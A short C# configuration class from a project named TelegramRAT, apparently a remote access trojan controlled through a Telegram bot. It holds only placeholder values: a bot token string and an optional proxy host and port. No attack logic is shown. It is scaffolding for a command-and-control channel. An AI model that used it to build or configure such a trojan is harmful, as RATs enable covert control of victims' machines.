namespace TelegramRAT
{
    public static class Configuration
    {
        public readonly static string BotToken = "Bot_API_key";

#if USE_PROXY
        public static class Proxy
        {
            public readonly static string Host = "ip";
            public readonly static int Port = 8080;
        }
#endif
    }
}
